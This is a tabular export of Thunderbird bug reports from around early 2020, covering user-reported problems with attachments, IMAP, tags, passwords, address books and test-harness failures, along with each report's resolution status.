1607691,"Changing checkbox ""using systemcolours"" does not change anything. Systemcolours are folowed anyway",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: In the dutch language version: In the latest update, my backgroundcolours in Thunderbird got dark (because my windows system setting is dark) If I go to options - options - view -fonts and colors button colours; there is a checkbox to choose weather or not I want to use the systemcolours. Actual results: If I check or unckeck the box doesn't change a thing (even after restart of thunderbird) Expected results: Dark mode in windows should give dark mode in Thunderbird and light mode in windows should give light mode in thunderbird"
1607695,TB does not remember the save path from first attachment anymore when saving multiple attachments,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: After update to version 68.3.1 Actual results: When incoming mail has multiple attachments the previous TB versions used to remember the path that was selected after the first attachment was saved. Now the whole path has to be entered again and again for each next attachment that needs saving. Expected results: Thunderbird should just like in the previous TB version have remembered the path where the previous attachment of a mail message was saved.
1607776,Emails in Local Folder Deleted,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: I tried moving a folder from my inbox to a local folder. (I use local folders to classify emails I retain from several email accounts.) Version is 72.0b3 Actual results: The inbox email remained (at least was displayed) in the inbox list. When I tried moving it to a different folder, that worked; however, when I tried to move the email from the ""different"" folder to the target folder, all the emails in the target folder disappeared, and Windows 10 File Explorer indicates the target folder is empty. Expected results: The inbox email should have been moved to the target folder and removed from the inbox list. Note: there is no indication given on the progress of moving emails; a progress indicator and completion/failure status would be helpful."
1607829,Composing message - changed message scroll behavior when pressing <Enter>,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Replying to the message and pressing <Enter> Actual results: When creating new line, cursor stays at the top and new lines or written text are moved above the cursor, out of visible view. If I want to view the text above the cursor, I have to scroll up or move the cursor with keyboard arrows. Cannot pinpoint which update did that, but the behavior wasn't like that before. Let's illustrate it like this, dashed line shows the top border of the visible message view. Steps: 1) --------------------- <Cursor here> 2) --------------------- Some text <Enter> 3) Some text <Enter> --------------------- <Cursor here> I cannot reproduce it always, in some messages it works as expected, in some it doesn't. Seems it has something to do with messages containing image and/or long text. Expected results: 1) --------------------- <Cursor here> 2) --------------------- Some text <Enter> 3) --------------------- Some text <Enter> <Cursor here>"
1607840,Thunderbird does not display attachments,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Some e-mails with attachments do not show these attachments in the main view of thunderbird. They also do not show a paper clipp symbol. To view these attachments I have to click ""forward mail"" which opens the composer. There, the attachments of the mail are displayed -- and I can open them. Actual results: Some mails do not show their attachments Expected results: Every mail should display its attachments when the mail is opened in the display, or as a paper clip symbol."
1607873,Thunderbird (Lightning Add-On) does no longer save the passwords for network calendars,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: Thunderbird 68.3.1 on a Win10 1909 (Build 18363.535) System - I made 200% sure that I had the checkbox to save the password was checked - I tried deinstalling and reinstalling lightning to see if I got an old version of the addon that does no longer work properly. No luck - I deinstalled Thunderbird fully and tried with a new installation and a new profile - same - no saving of the passwords. Now even the checkbox to save the passwords is gone - I reset my old profile to be used - checkbox gone there now as well - no saving of passwords Actual results: See above at what I did. Expected results: In the past Lightning/Thunderbird did safe the passwords for a network calendar on an FTP-Server in its list of passwords. That does no longer happen. No saved passwords for the FTP-Calendar - passwords for the emails still working (so I hesitate to delete one from the password manager)"
1607949,Pressing J for removing junk icon not working,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Open thunderbird and go to your inbox. This was tested using my gmail account. Highlight one of your emails and press the j button. This should mark it as junk. Press j again and it does not unmark it. This is in contrast to the star and mark read hotkeys. Actual results: Nothing happened. Expected results: The email should have been marked as not junk.
1607998,Archive button is not working in OWL,RESOLVED,--,MOVED,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: I have just started using Thunderbird since Outlook for the Mac drove me insane. The account is an office 365 account which I guess uses the owl plugin for some things. Anyway, I see my inbox and all my emails nicely. However, when I try to Archive a message in the inbox, nothing happens (tried each of pressing 'A', right clicking the message -> archive as well as Menu -> Message -> Archive). Actual results: Nothing happens the message stays in inbox and there's no visual change on my screen. Expected results: The message should have been moved to the archive folder and be removed from the inbox"
1608015,Contact loses part of display name when moving to different address book (if display name contains ö or ü?),RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: - import contact list via .txt file (creates a new address book) - create new (distribution/email) list in target address book - drag and drop all contacts of imported address book to target mailing list Actual results: All contacts got copied, while one contact got dropped part of the field 'display name'. The contact's name was something like ""Könüs Original-Verhuis"" - so with ö and ü and a dash before the second part of the last name. This second part of the last name (""-Verhuis"" in my example) was dropped (only ""Könüs Original"" left) in the display name of the (new) contact on my mailing list. Expected results: The full name should have persisted."
1608017,Print preview - how to change the bar height,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Expected results: How can I change the height of the print preview menu ?"
1608061,"""Get Messages"" seems to remove all the tags from my messages.",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 Steps to reproduce: I upgraded to Version 68.3.1, and all my tags had disappeared. I tried to tag manually some of the most recent messages, but the tagging kept disappearing. I disabled all Message Filters, and retagged manually one recent message of the top of my mailbox. It remained tagged for a while, but as soon as I click on the ""Get Messages"" button, the tag disappears. Application Basics Name: Thunderbird Version: 68.3.1 Build ID: 20191215232630 Update Channel: release User Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Thunderbird/68.3.1 OS: Windows_NT 10.0 Launcher Process: Enabled Multiprocess Windows: 0/0 Disabled Remote Processes: 0 Enterprise Policies: Inactive Google Location Service Key: Missing Google Safebrowsing Key: Missing Mozilla Location Service Key: Missing Safe Mode: false Mail and News Accounts account1: INCOMING: account1, , (imap) imap.1und1.de:993, SSL, passwordCleartext OUTGOING: , smtp.1und1.de:587, alwaysSTARTTLS, passwordCleartext, true OUTGOING: , smtp.1und1.de:587, alwaysSTARTTLS, passwordCleartext, false OUTGOING: , smtp.1und1.de:587, always"
1608085,adding a second exchange account hosted on same server domain,RESOLVED,--,MOVED,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Steps to reproduce: the manual setup button doesnt work when adding a second exchanbe account. Actual results: I get a warning telling me to use manual setup and use EWS, nut the button doesnt popen any additional settings Expected results: opened manual setup, see screen shot"
1608172,"Since update to 68.3.1 problem opening attachments, almost always with PDFs, and error message is ""This file cannot be found.""",RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I try to open email attachments directly from the attachment to the email. The problem is most significant with PDFs (the format for most most of my attachments received). Except for trying to open with TWINUI, which sometime works, I get the error message ""This file cannot be found."" The error occurs with multiple programs (e.g., Acrobat, Nuance Power Pro, etc.). The problem appears to have started after update to version 68.3.1. Actual results: When I try to open an attachment directly from the email, I get error message :This file cannot be found"" and it happens almost every time with PDFs no matter what program I select to open with except for TWINUI which work sometimes. If I save the attachment rather than trying to open it, I can then retrieve the attachment and open it with just about anything. Expected results: I should get the ""what do you want Thunderbird to do"" and be able to select the program with which to open the attachment and the program should then open the attachment directly from the email."
1608204,After installing German (Germany) dictionary you cant use it,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: 1. Install the dictionary German (Germany) 2. Write email 3. Right-Click and check for ""check spelling"" 4. Check the languages To note: I use Linux Actual results: Only English (US) is a option. Expected results: German dictionary is a option."
1608306,Extra folders were produced when I exported my address book(s) from the released version of Thunderbird into the Beta version.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I exported address book folders from the released Thunderbird (version 68.3.1) and then imported them into the Beta version of Thunderbird (version 72.0b3). I used the CSV option in the export function, I believe. Actual results: Extra folders were produced in the address book. I got two copies of the Personal Address Book folder (one containing addresses, one blank) and two copies of the Collected Addresses (one containing addresses, one blank). Also, the custom mailing lists did not export/import from one version of Thunderbird to the other, although I don't know if that's a bug. It might just be the expected behavior. Expected results: There shouldn't have been extra, empty Personal Address Book and Collected Addresses folders created."
1608317,IMAP folders containing parentheses cause non-display of folder contents in Thunderbird,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 Steps to reproduce: In Thunderbird, rename an IMAP folder containing messages to string including parentheses. Actual results: Messages within the folder are not listed, although in the status bar the quantity of messages is displayed. Expected results: Messages within the IMAP folder should be listed."
1608401,[Account Settings] [Subscribe (for IMAP folders)] Window size goes smaller when reopened,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.94 Safari/537.36 Steps to reproduce: Account Settings Subscribe (for IMAP folders) ▲ These 2 windows will go smaller when reopened. Open, close, reopen either of them. The window goes smaller. Each time: Width -8px Height -28px (The pace is apparently according to the window border size including the title on my OS.) ▼ Exception: Open it, Switch focus to another app, Switch back, Close it, reopen it. The size does not change. Expected results: In my memory v60 didn't have the issue on the 2 windows."
1608483,Cannot customize buttons since update from v68.3.1 to 68.4.1,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open customize window, trying to move buttons and spaces to toolbar. Also tried in safe mode. Actual results: Neither moving buttons and spaces from customize window to toolbars nor the other way round works. Expected results: Moving buttons and spaces should work as before."
1608511,C-C mochitest does not run if we have some symlinks in related directories. (|make mozmill| did work with the symlinks.),NEW,--,,"(This is a quote of a discussion from Maildev mailing list.) mochitest runtest.py has a too strict path consistency check or it is not handling symlinks in an intelligent manner. |make mozmill| did not have any such issues with symlinks in my filesystem. -- begin quote --- On 2019/12/25 20:15, Magnus Melin wrote: > ./mach test comm/mail/test/browser/composition/browser_imageInsertionDialog.js Thanks. BTW, This is under Linux amd64. I updated the source just in case this morning. I think several files were updated under ./comm subdirecotry as well as many under ./mozilla main directory. Rebuilt TB. Unfortunately, it is still NG, and I found the cause, I think. The tail of the log shows: (there are a few locally added error logs.) ``` ++ echo 'Your current directory is' Your current directory is ++ pwd /NREF-COMM-CENTRAL/mozilla ++ /NREF-COMM-CENTRAL/mozilla/mach --log-no-times test comm/mail/test/browser/composition/browser_imageInsertionDialog.js kind=None environ.get('TERM', 'unknown')=xterm-256color environ.get('TERM', 'linux')=xterm-256color kind=None environ.get('TERM', 'unknown')=xterm-256color environ.get('TERM', 'linux')=xterm-256color 0:01.07 INFO Checking for ssltunnel pro"
1608518,Manage Identities dialog becomes unusable with many identities,RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Open the Manage Identities dialog box, for an account that has many identities defined. Actual results: The dialog box appears, but is too tall to fit on screen and does not have any sort of resizing or scrolling mechanism. This makes it impossible to see or work with the later entries in the list. Expected results: The dialog is resized to fit on screen and the list can be scrolled if there are too many entries to fit."
1608532,"C-C TB mochitest does not run locally on a linux PC due to an assertion.: GECKO(119773) Assertion failure: !mRawPtr, at /NEW-SSD/moz-obj-dir/objdir-tb3/dist/include/mozilla/StaticPtr.h:51",NEW,--,,"Debian GNU/Linux amd64. Imake mozmill| used to work until December on the same PC, so it is hard to believe that there is a binary toolchain issue, but I cannot rule it out. The main part of the error log (longer one is attached) is: ``` 0:02.12 GECKO(119773) [119773, Unnamed thread 556442d30950] WARNING: XPCOM objects created/destroyed from static ctor/dtor: file /NEW-SSD/NREF-COMM-CENTRAL/mozilla/xpcom/base/nsTraceRefcnt.cpp, line 198 0:02.12 GECKO(119773) ### XPCOM_MEM_BLOAT_LOG defined -- logging bloat/leaks to /COMM-CENTRAL/TMP-DIR/tmpIWM7ka.mozrunner/runtests_leaks.log 0:02.12 GECKO(119773) Assertion failure: !mRawPtr, at /NEW-SSD/moz-obj-dir/objdir-tb3/dist/include/mozilla/StaticPtr.h:51 0:02.45 GECKO(119773) #01: __static_initialization_and_destruction_0(int, int) (/NEW-SSD/moz-obj-dir/objdir-tb3/dist/include/mozilla/Assertions.h:42) 0:02.46 GECKO(119773) #02: _GLOBAL__sub_I_Unified_cpp_xpcom_base2.cpp (/NEW-SSD/NREF-COMM-CENTRAL/mozilla/xpcom/base/nsWeakReference.cpp:160) 0:02.53 GECKO(119773) #03: call_init (/build/glibc-suXNNi/glibc-2.29/elf/dl-init.c:71) 0:02.53 GECKO(119773) #04: _dl_init (/build/glibc-suXNNi/glibc-2.29/elf/dl-init.c:118) 0:02.53 GECKO(119773) #05: dl_"
1608542,Can't send email through Office 365 account,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: After upgrade to 68.4.1 on Mac tried to send email through Office 365. Outgoing server settings: smtp.office365.com, Port 587, correct user name, Authentication method: Normal Password, STARTTLS. This has worked until this upgrade. Actual results: ""Login to account ""Microsoft Live Hotmail"" failed. Login to server smtp.office365.com with username xxx failed. Enter New Password, Cancel, Retry. Reentering password yields same result, as does retry. Cancelling gives Send Error Message: Sending of the message failed. Failed due to unexpected error 80004005. No description is available. The message could not be sent using Outgoing server (SMTP) smtp.office365.com for an unknown reason. Please verify that your Outgoing server (SMTP) settings are correct and try again. Expected results: Mail should have been sent, as in the past."
1608591,Installation of Thunderbird 68.4.1 on 27-inch iMac wiped out all files and Address Book (from profile),RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15 Steps to reproduce: Inbox files and Sent files were deleted by installation of 68.4.1. All historical data lost. Will have to re-build as we go. Actual results: Need to re-build Address Book. Expected results: Installation should have been seamless as it has always been. But the installation message said everything had to be re-created. In other words, start from scratch as if Thunderbird had not been previously installed. Thanks a lot!"
1608614,the accelerator Alt+C is Duplicated on the traditional tools menu on Windows.,NEW,--,,Following a support request https://support.mozilla.org/en-US/questions/1276960 I confirmed that both Chat Status and Run Junk mail controls on folder use the same accelerator in the Tools menu bar.
1608626,browser.menus.overrideContext doesn't work,RESOLVED,--,FIXED,"I've just been trying to use the `browser.menus.overrideContext()`, however it is not working. It looks like the `on-prepare-contextmenu` event [has not been implemented fully](https://searchfox.org/comm-central/search?q=on-prepare-contextmenu&case=false&regexp=false&path=) in Thunderbird, and therefore the `overrideContext` functionality never gets the event triggered, and hence cannot override the context menu."
1608636,List of references in message header aligned vertical instead of horizontal,RESOLVED,--,FIXED,Probably since the landing of bug 1606130 (with same looking regression bugs) the newsgroup references are in the header no more only on one line.
1608647,Main Password Issue,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Just upgraded to version 68.3.1 and then 68.4.1 Actual results: Opening both the new releases of Thunderbird on Mac, it doesn't require the main password entry as the very first thing like it was in every previous version, until I push ""Download Messages"". At that point it requires the main password entry. In this way anyone can have full access to messages because the app is no more password protected. I'm a long time Thunderbird user and this is the first release having this issue. Expected results: At program start it should require the main password to let the user do something. If one doesn't enter the main password the app blocks both navigation and messages' reading. I've chosen Thunderbird over the years because it's the only program that I know having this feature, so I feel protected by this, sharing my Mac with other people."
1608653,"Thunderbird launches very slowly when assistive technologies are used (JAWS) and large imap inbox, and causes JAWS restarts",RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: If Thunderbird is started, it takes a while before Thunderbird is completely started and the emails are retrieved. Interaction with Thunderbird is no longer possible during this time. It's like Thunderbird is completely freezing for a short time. This means that my Screen Reader (JAWS) will restart because JAWS thinks that the Screen Reader is no longer responding. Since this problem bothers me a lot, I wanted to run Thunderbird at least in the background. However, that doesn't really help me either. If a new email arrives and I switch to Thunderbird with ALT + TAB, the window is not properly focused for a few seconds. After about 15 to 30 seconds I can interact with Thunderbird again, which means that I can navigate in the message list as usual and open emails. When an email arrives, Thunderbird sends a system-wide notification that a new email has arrived. This message is announced by JAWS. These Thunderbird system notifications were mostly read twice. Since the latest beta, Thunderbird only responds after the second notification has "
1608700,"When searching for e-mail address in Gloda, using keyboard to highlight a recommendation and pressing enter does not search for the highlighted item (full address) but the entered partial address (take 2)",RESOLVED,--,FIXED,"+++ This bug was initially created as a clone of Bug #1490428 +++ Bug 1490428 is back :-( Steps to reproduce: type start of an email address in the search bar. I get some suggestions that include the full email address I am searching for. I use the arrow keys to move down to the suggested email address I want (it is now highlighted in a blue). I press the ENTER key to select the suggested email address and the search results window pops up but it only searches for the partial email that I had typed in the box. iT does not search for the full email address that was highlighted blue. If I click my mouse cursor on the suggested name it will search for the full email address. Actual results: search results tab shows search for the partial email address that i had started typing in the box before the suggestion were listed. Expected results: it should have searched for the full email address that was highlighted in blue when I pressed enter key. Or in other words: Type something into the Gloda search box. Compare selecting an auto-complete result selected via mouse click with one selected via arrow navigation and enter. They should be the same, but aren't. Alice, once again, can you ple"
1608730,Gmail authentication failure,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Downloading mail from previously working Gmail server account. Actual results: Account settings were unchanged from a previous working state other than a password change. Since the password change any attempt to download mail fails with Authentication failure while connecting to server imap.gmail.com Other Gmail accounts are working as intended, this issue only appears to affect the one account which has had a password change Expected results: Mail should be downloaded"
1608733,close/cancel original message while sending reply causes TB to hang,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I open a received message, click Reply, write a reply message, click Send, then close the original message before the reply message is finished sending. TB hangs and I need to force quit TB (Mac). When I close the original message, I am doing that by clicking the red X icon in the upper left of the message (Mac). I have seen this happen many times over the past months. Most of those occurrences have been on my home ISP which is Viasat (satellite). In order for the error to occur, the sending of the reply message needs to be sufficiently delayed – if it completes very quickly, there's no time to close the original message. What is governing how fast the sending takes I don't know, but I suppose it is related to how fast the remote mail server is responding, but could also be related to the network, or some other factor. If there's a delay of a few seconds, this allows the bug to appear because that's sufficient time for me to close the original message. I just saw this bug happen while using a fast cable broadband connection, but I'm not able to reproduce it because the"
1608756,"pdf, xls, xlxs files open slow",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: After updating to Thunderbird 68, files like xls, pdf, xlxs opening slow[15-25 sec took to show splash screen]. but odt, ods like open fast even using same app[1-3sec took to show splash screen]. Actual results: There is some time delay in opening. Tested in two system same issue."
1608773,No sound when playing a MP3 file for new mail announcement (but mp3 can be selected),REOPENED,P5,,"Thunderbird version 60.9.1 under Windows 10 doesn't appear to support anything other than .wav files in tools -> options -> general -> when new messages arrive -> use the following sound file. Version 68.4.1 lets you select from a wide variety of audio file formats. However, there is no sound when you play .mp3 files. I suspect the same problem occurs for the other new audio file formats . .wav files still work fine. I normally use https://www.thesoundarchive.com/play-wav-files.asp?sound=email/pbchain.wav (.wav version of a pinky and the brain you've got a chain letter sound clip). That works fine with both versions. If I use the .mp3 verison with 68.4.1 - https://www.thesoundarchive.com/play-wav-files.asp?sound=email/pbchain.mp3 - it does nothing both when new mail arrives, and when I use the play button. I can play the downloaded .mp3 file fine by double clicking it using File Explorer. I did a quick search of the various Thunderbird 68.* release notes and didn't spot any mention of adding support for other audio file formats, but may have missed it. Is this feature supposed to work, or is this a unexpected side effect of the latest version of Gecko that wasn't noticed?"
1608819,IMAP login not working,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Trying to login into an IMAP account operated by Cyrus IMAPD 2.5.15 with Cyrus SASL 2.1.26 using IMAPS on port 993. I also tried using STARTTLS on port 143 but that also did not work. I am using Thunderbird 68.3.1 on openSUSE Tumbleweed but have also tested it with Thunderbird 68.4.1 on Windows 10. Actual results: Login never finishes. After negotiating TLS encryption, nothing happens anymore. Thunderbird log: 2020-01-13 13:58:23.599885 UTC - [(null) 20795: Unnamed thread 0x7fa752eec820]: D/IMAP ImapThreadMainLoop entering [this=0x7fa753468000] 2020-01-13 13:58:23.610316 UTC - [(null) 20795: Main Thread]: I/IMAP 0x7fa753468000:hbn.huessenbergnetz.de:NA:SetupWithUrlCallback: clearing IMAP_CONNECTION_IS_OPEN 2020-01-13 13:58:23.610474 UTC - [(null) 20795: Unnamed thread 0x7fa752eec820]: I/IMAP 0x7fa753468000:hbn.huessenbergnetz.de:NA:ProcessCurrentURL: entering 2020-01-13 13:58:23.610515 UTC - [(null) 20795: Unnamed thread 0x7fa752eec820]: I/IMAP 0x7fa753468000:hbn.huessenbergnetz.de:NA:ProcessCurrentURL:imap://hbn0012@hbn.huessenbergnetz.de:993/verifyLogon: = currentUrl 2020-01-13 13"
1608893,MacOS Thunderbird Appmenu menu items not working if starting offline,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Click on Thunderbird menu (the one containing About Thunderbird, Preferences, etc.), and choose any item, e.g. the first one. Actual results: Nothing. No popup of the About Thunderbird dialog. Expected results: The dialog should pop up to give version number, etc. Similarly, the other menu entries other than ""Services"" in the Thunderbird menu do nothing. Services opens a submenu which works."
1608982,Email attachment with spaces in file name fails to open,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: The attachment to email was double clicked and ""Open with"" dialog presented to choose application to use for opening the application of the given type. Actual results: Application was selected and confirmed with OK button. Then, two scenarios: a) in case the file type of attachment is associated with application to open in Options ->Attachments, then error console shows ""uncaught exception: 2153578497"" and another window ""Run appplication"" is present and asked to send to ""file"". b) in case the app is associated with attachment file type, it throws an exception in console: [Exception... ""Component returned failure code: 0x80520003 (NS_ERROR_FILE_EXECUTION_FAILED) [nsIMIMEInfo.launchWithFile]"" nsresult: ""0x80520003 (NS_ERROR_FILE_EXECUTION_FAILED)"" location: ""JS frame :: resource://gre/modules/DownloadIntegration.jsm :: launchFile :: line 831"" data: no] DownloadIntegration.jsm:831:16 launchFile resource://gre/modules/DownloadIntegration.jsm:831 launchDownload resource://gre/modules/DownloadIntegration.jsm:787 launch resource://gre/modules/DownloadCore.jsm:740 _succeed resour"
1609043,Attachments open incorrectly as individual file for each word in filename,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Same found in last update - 68 something I think. I did report it on the Forum thing. I tried to open an attachment to an email in Thunderbird. There are also newly introduced problems when I try to save attachments but I don't have the details to hand. Actual results: Attachment did not open. Instead Firebird flooded with opened files for every individual word in the filename of the attachment. Attachments worked well (apart from not actually being detached after using the ""detach"" command. It had done this for years but was, in fact, quite convenient sometimes so I didn't report it.) until about two updates ago. At the time, the Release Notes said that Attachment Handling had been ""improved"". The reverse was true and it has been causing me huge problems ever since. I may have to start using Word! Expected results: The attached file should simply have opened, as it had in previous versions."
1609044,image rotation (inline) displayed differently in tab and window,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; rv:71.0) Gecko/20100101 Firefox/71.0 Steps to reproduce: Smartphone photo was rotated 90 deg in Win 10 app before adding to email (inline). After sending, the displayed photo orientation is different in tab display and in window display (as expected by the 90 deg). Actual results: whether rotation is regarded or not, it should at least be consistent. Hopefully same display as in OS image apps."
1609047,"Composition tests permanently broken on Linux, 32-bit, debug",RESOLVED,--,INVALID,"This test folder is now failing on every run. It gets to the end, stops, then watchdog comes along and crashes the process. I don't really expect there to be an easy fix, Linux 32 is now tier 2, and we have other platforms running the same test, so I'm just going to turn it off."
1609146,Thunderbird displays raw message headers and HTML,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Received order update from Amazon and unformatted (with no carriage returns) message header information is displayed at the top of the email. Received message from CamelCamelCamel today (alonmg with numerous other messages recently and the message is unformatted HTML source -- not being interpreted. Actual results: Mail transmission header data is presented in message body. Source HTML is presented in message body. Expected results: No header data should be presented in message body, certainly not unformatted. HTML should have been presented as interpreted message not source."
1609234,"Dialog boxes ""Compact Folders"" and ""Enter Password"" block each other",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Start Thunderbird with Master password, but password for mail account, which is connected on startup, is not storred; Thunderbird, MacOSX v68.4.1; no updates pending Actual results: Thunderbird asks about the master password, then displays a dialogue box asking to compact the folders and then stalls. The icon of the Inbox is animated; the status line says, that an email account is to be opened, the list of windows mentions a dialogue box to query the email account's password Expected results: either let me select either Cancel or Compact in the Compact dialogue box or Enter password of mail account to proceed"
1609249,Thunderbird for Mac (64 bit) missing oauth authentication method for gmail,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: See the problem discussion here: https://support.mozilla.org/en-US/questions/1277110 I tried to locate the oauth authentication method for logging into Google gmail accounts - since it will soon be REQUIRED I was asked to file this report by support techs ... Actual results: There is NO oauth authentication for logging into gmail accounts on Thunderbird for Mac: https://support.mozilla.org/en-US/questions/1277110 Expected results: According to the Support Techs: Google will very soon stop supporting Thunderbird on Mac because it does not have the required method of authentication: https://support.mozilla.org/en-US/questions/1277110
1609360,"After Version 68 release, colour of tags no longer visible unless clicking on email",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Tag bug after version 68 update Actual results: After version 68 release, colour of tags no longer visible unless clicking on email Expected results: Tag colours should be visible even if user does not click on email"
1609378,nsIMsgDBView.addColumnHandler doesn't correctly restore hidden columns,RESOLVED,--,MOVED,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: On opening Thunderbird the 'Between' column is displayed in the inbox view. This hasn't been selected to do do so. Changing inboxes and back and it disappears as it should. It also appears sporadically during an open session. Actual results: Column displayed that hasn't been set to do so. Expected results: Columns shown should be the ones selected.
1609389,OSX Thunderbird keeps crashing on startup,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: clicked app icon Actual results: App opens the crashes after a few seconds. Same happens when starting in safe mode Expected results: app should have stayed open
1609391,Subject column has been hidden and not able to display it again,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: Suddenly while using the thunderbird mail app the ""Subject"" column has hidden and I am not able to find any option to display it back."
1609419,Email preview not show attached txt,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.4050.0 Iron Safari/537.36 Steps to reproduce: Since I've update to Version 68.4.1 I'm non able to preview the .txt files attached to the emails.... Actual results: Email preview don't show txt files attached to email Expected results: It was a function that I thought very useful, now I have to open each email attachement's to view the txt contents files to find what I need ... Is there any way I can restore this feature? Thank you all"
1609420,"headers like To are not all shown, but instead stacked and some hidden",RESOLVED,--,FIXED,"On trunk (I think since some days at least), when you look at a message with many people in who, only the first one is shown. The other elements are there, it's just that they appear to be out of view. Richard, any ideas?"
